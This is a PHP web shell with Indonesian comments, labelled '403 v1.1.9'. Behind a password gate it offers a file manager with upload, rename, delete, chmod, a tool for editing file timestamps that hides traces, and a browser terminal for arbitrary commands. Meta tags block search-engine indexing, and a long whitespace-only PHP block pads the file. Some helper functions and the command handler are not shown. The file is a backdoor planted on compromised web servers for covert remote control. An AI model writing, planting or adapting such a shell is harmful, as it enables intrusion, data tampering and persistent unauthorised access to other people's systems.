<?php
session_start();

// Ganti hash ini dengan milikmu (sudah kamu berikan)
$hashedPassword = '$2a$12$J5OF.qUCpXv0zFde9tkAReqdOUK4XaUvXFWv2yTWN2oH7ItotxXN2';

// Jika belum login, tampilkan form
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $hashedPassword)) {
            $_SESSION['logged_in'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $error = "Password salah!";
        }
    }

    // Tampilkan form login
    echo '<!DOCTYPE html><html><head><title>Login</title></head><body style="background-color:#001f3f; color:white; font-family:sans-serif; text-align:center; margin-top:100px;">
        <form method="post">
            <h2>🔐 Masukkan Password</h2>
            <input type="password" name="password" style="padding:10px; font-size:16px;" required>
            <br><br>
            <button type="submit" style="padding:10px 20px; font-size:16px;">Login</button>
            <br><br>';
    if (isset($error)) {
        echo '<div style="color:red;">' . htmlspecialchars($error) . '</div>';
    }
    echo '</form></body></html>';
    exit;
}
?>

<?php
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          

?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title></title>
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex, nofollow">
    <meta name="bingbot" content="noindex, nofollow">
    <meta name="slurp" content="noindex, nofollow">
    <meta name="yandex" content="noindex, nofollow">
    <meta name="duckduckbot" content="noindex, nofollow">
    <link rel="icon" type="image/png" sizes="16x16" href="https://cdnkumana.web.app/img/dragon-ico.webp">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    <link href="https://fonts.cdnfonts.com/css/qanelas" rel="stylesheet">
    <style>
      body {
            background-color: #001f3f;
            color: #ffffff;
            font-family: 'Qanelas', sans-serif;
            /* font-style: italic; */
            font-weight: 500;
            margin: 0;
            padding: 0;
            overflow: hidden;
            position: relative;
        }

        .drop {
            position: absolute;
            background: linear-gradient(180deg, #ffcc00, #ffcc00);
            width: 1.5px;
            height: 20px;
            opacity: 0.6;
            transform: rotate(10deg);
            animation: fall linear infinite;
        }

        @keyframes fall {
            0% {
                transform: translateY(-100px) rotate(10deg);
                opacity: 0;
            }
            10% {
                opacity: 0.6;
            }
            100% {
                transform: translateY(100vh) rotate(10deg);
                opacity: 0;
            }
        }

        #container {
            background-color: black;
            padding: 20px;
            margin: 10px;
            border-radius: 10px;
            max-width: 100%;
            width: 100%;
            box-sizing: border-box;
        }
        h2 {
            font-size: 24px;
            color: #fff;
        }
        a {
            color:rgb(255, 255, 255);
            text-decoration: none;
        }
        a:hover {
            text-decoration: underline;
        }
        .actions button {
            background-color:rgb(255, 255, 255);
            border: none;
            color: #001f3f;
            padding: 5px 10px;
            margin-right: 5px;
            border-radius: 5px;
            cursor: pointer;
        }
        .actions button:hover {
            background-color: #3399ff;
        }
        #server-info {
            margin-top: 30px;
            background-color: #002b5c;
            padding: 15px;
            border-radius: 8px;
        }
        #server-info h3 {
            margin-top: 0;
            color: #ffcc00;
        }
        #server-info table {
            width: 100%;
            border-collapse: collapse;
        }
        #server-info th, #server-info td {
            border: 1px solid rgb(0, 0, 0);
            padding: 8px;
        }
        .table-wrapper {
            overflow-y: auto;
            max-height: 420px;
            border: 1px solid #444;
            margin-top: 10px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            table-layout: fixed;
        }
        th, td {
            padding: 1px;
            text-align: left;
            border-bottom: 1px solid #444;
            word-wrap: break-word;
        }
        th {
            background-color: rgb(235, 180, 0);
            padding: 10px;
            color: #000;
            position: sticky;
            top: 0;
            z-index: 10;
        }
        tr:nth-child(even) { background-color: #003366; }
        tr:nth-child(odd) { background-color: #000000; }

        @media (max-width: 768px) {
            #container {
                padding: 10px;
            }
            h2 {
                font-size: 18px;
            }
            table {
                font-size: 12px;
            }
        }

        #create-file-form {
            display: none;
        }
    </style>
    <script>
        function toggleCreateFileForm() {
            const createFileForm = document.getElementById('create-file-form');
            createFileForm.style.display = createFileForm.style.display === 'none' ? 'block' : 'none';
        }
    </script>
</head>
<body>
<script>
    function createRain() {
        const numberOfDrops = 150;
        for (let i = 0; i < numberOfDrops; i++) {
            const drop = document.createElement('div');
            drop.classList.add('drop');
            drop.style.left = `${Math.random() * 100}vw`;
            const height = Math.random() * 20 + 10; 
            drop.style.height = `${height}px`;
            const duration = Math.random() * 1 + 1.5; 
            const delay = Math.random() * 2; 
            drop.style.animationDuration = `${duration}s`;
            drop.style.animationDelay = `${delay}s`;
            document.body.appendChild(drop);
        }
    }
    createRain();
</script>
<style>
    .header {
        text-align: center;
        padding:  10px 10px 10px; 
        background-color: #001f3f;
    }

    .header img {
        max-width: 250px;
        height: auto;
        margin-top: 7px;
    }
</style>
<?php if (!isset($_GET['edit'])): ?>
<div id="container">
    <h2>📂 FILE MANAGER</h2>

<!-- Breadcrumb dan Back Home -->
<div style="display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; margin-bottom: 15px; font-size: 14px;">
    <div class="breadcrumb">
<?php
echo '<div class="breadcrumb">';
$breadcrumbs = explode(DIRECTORY_SEPARATOR, $currentPath);
$breadcrumbPath = '';
$lastIndex = count($breadcrumbs) - 1;

foreach ($breadcrumbs as $index => $dir) {
    $breadcrumbPath .= $dir . DIRECTORY_SEPARATOR;
    echo '<a href="?d=' . urlencode($breadcrumbPath) . '">' . x($dir) . '</a>';
    if ($index !== $lastIndex) {
        echo ' / ';
    }
}
echo '</div>';
?>


    </div>
    <div>
        <a href="?d=<?= urlencode(realpath('.')) ?>" style="color: #ffcc00; text-decoration: none;">
            <i class="fa-solid fa-arrow-left"></i> 
        </a>
    </div>
</div>

<div style="display: flex; flex-wrap: wrap; gap: 10px; align-items: center; font-size: 14px; margin-bottom: 15px;">

    <!-- Upload File -->
    <form method="POST" enctype="multipart/form-data" style="display: flex; gap: 5px; align-items: center;">
        <input type="file" name="uploaded_file" required>
        <button type="submit" name="upload"><i class="fas fa-upload"></i> Upload</button>
    </form>

    <!-- Create File Toggle Button -->
    <button onclick="toggleCreateFileForm()" style="padding: 5px 10px;"><i class="fas fa-file-alt"></i> File</button>
    <!-- Tombol Terminal -->
    <button type="button" onclick="toggleTerminal()" style="background-color: black; color: lime; padding: 5px 10px;">🖥️ Terminal</button>
</div>
<!-- Form terminal (disembunyikan saat awal) -->
<div id="terminalBox" style="display:none; margin-top:10px;">
<form id="terminal-form" style="display: flex; gap: 10px;" onsubmit="return runTerminal(event);">
    <input type="text" id="command" name="command" placeholder="Contoh: ls -la" style="flex:1; padding:5px;" required>
    <button type="submit">Run</button>
</form>
<div id="terminal-result" style="margin-top:10px; background-color:#000; color:#0f0; padding:10px; font-family:monospace; white-space:pre-wrap; border-radius:5px;"></div>


    <?php if (!empty($terminalOutput)): ?>
    <div style="margin-top:10px; background-color:#000; color:#0f0; padding:10px; font-family:monospace; white-space:pre-wrap; border-radius:5px;">
        <?= $terminalOutput ?>
    </div>
    <?php endif; ?>
</div>


<!-- Create File Form (toggle) -->
<form method="POST" id="create-file-form" style="display: none; margin-bottom: 15px;">
    <input type="text" name="new_file_name" placeholder="Nama File.txt" required style="width: 100%; margin-bottom: 5px;">
    <textarea name="new_file_content" rows="4" placeholder="Isi file..." required style="width: 100%; margin-bottom: 5px;"></textarea>
    <button type="submit" name="create_file"><i class="fas fa-plus"></i> Save</button>
</form>


    <!-- File Table -->
    <div class="table-wrapper">
        <table>
<tr>
    <th style="width: 35%;">Name</th>
    <th style="width: 8%;">Perm</th>
    <th style="width: 12%;">Size</th>
    <th style="width: 10%;">Tanggal</th>
    <th style="width: 15%;">Action</th>
</tr>




            <!-- Tabel file/folder tetap di bawah -->


<form action="" method="post">
    <input type="text" name="newFolderName" placeholder="Enter new folder name">
    <input type="submit" value="Create Folder">
</form>

<?php
$files = scandir($currentPath);
$folders = [];
$regularFiles = [];

foreach ($files as $file) {
    if ($file !== '.' && $file !== '..') {
        $fullPath = $currentPath . DIRECTORY_SEPARATOR . $file;
        if (is_dir($fullPath)) {
            $folders[] = $file;
        } else {
            $regularFiles[] = $file;
        }
    }
}

// Gabungkan folder dulu, lalu file
$allItems = array_merge($folders, $regularFiles);

foreach ($allItems as $file) {
    $fullPath = $currentPath . DIRECTORY_SEPARATOR . $file;
    $permissions = is_readable($fullPath) ? substr(sprintf('%o', @fileperms($fullPath)), -4) : 'N/A';
    $size = (is_file($fullPath) && is_readable($fullPath)) ? formatSize(@filesize($fullPath)) : 'Folder';
    $icon = getIcon($fullPath);

    // Link untuk folder dan file berbeda
    $link = is_dir($fullPath)
        ? "<a href='?d=" . urlencode($fullPath) . "'>" . x($file) . "</a>"
        : "<a href='?view=" . urlencode($fullPath) . "'>" . x($file) . "</a>";

    echo "<tr>
            <td>$icon $link</td>
            <td>
    <form method='POST' style='display:inline;'>
        <input type='hidden' name='chmod_path' value='" . x($fullPath) . "'>
        <input type='text' name='new_chmod' value='$permissions' style='width:45px; font-size:11px; padding:2px;'>
        <button type='submit' name='edit_chmod'><i class='fas fa-lock'></i></button>
    </form>
</td>

            <td> $size</td>
		    <td>
    <form method='POST' style='display:flex; gap:2px;'>
        <input type='hidden' name='touch_path' value='" . x($fullPath) . "'>
        <input type='text' name='new_date' value='" . date("Y-m-d H:i", @filemtime($fullPath)) . "' style='width:110px; font-size:10px; padding:2px;'>
        <button type='submit' name='edit_date' title='Ubah Tanggal' style='font-size:10px;'>🕒</button>
    </form>
</td>

            <td class='actions'>
                <form method='POST' style='display:inline;'>
                    <input type='hidden' name='rename_path' value='" . x($fullPath) . "'>
                    <input type='text' name='new_name' placeholder='Nama Baru' style='width:70px; font-size:11px; padding:2px;'>
                    <button type='submit' name='rename'><i class='fas fa-edit'></i></button>
                </form>
                <form method='POST' style='display:inline;'>
                    <input type='hidden' name='delete_path' value='" . x($fullPath) . "'>
                    <button type='submit'><i class='fas fa-trash-alt'></i></button>
                </form>";

    // Hanya tampilkan tombol edit untuk file
    if (is_file($fullPath) && is_readable($fullPath)) {
        echo "
        <span style='display: inline-block;'>
            <a href='?edit=" . urlencode($fullPath) . "' title='Edit file'><i class='fas fa-pen' style='margin-right: 5px; color: #ffaa00;'></i></a>
        </span>";
    }

    echo "</td>
          </tr>";
}


?>

        </table>
		
    </div>
</div>
<h4 style="color:#ffcc00; text-align: center; margin: 20px auto; width: 100%; max-width: 100%; font-size: 1rem;">403 v1.1.9</h4>
<script>
function toggleTerminal() {
    const box = document.getElementById('terminalBox');
    box.style.display = (box.style.display === 'none') ? 'block' : 'none';
}
</script>
<script>
function runTerminal(event) {
    event.preventDefault(); // Cegah submit biasa

    const cmd = document.getElementById('command').value;

    fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded'
        },
        body: 'ajax_command=' + encodeURIComponent(cmd)
    })
    .then(res => res.text())
    .then(data => {
        document.getElementById('terminal-result').innerText = data;
    })
    .catch(err => {
        document.getElementById('terminal-result').innerText = 'Error: ' + err;
    });

    return false;
}
</script>

</body>
<?php endif; ?>
</html>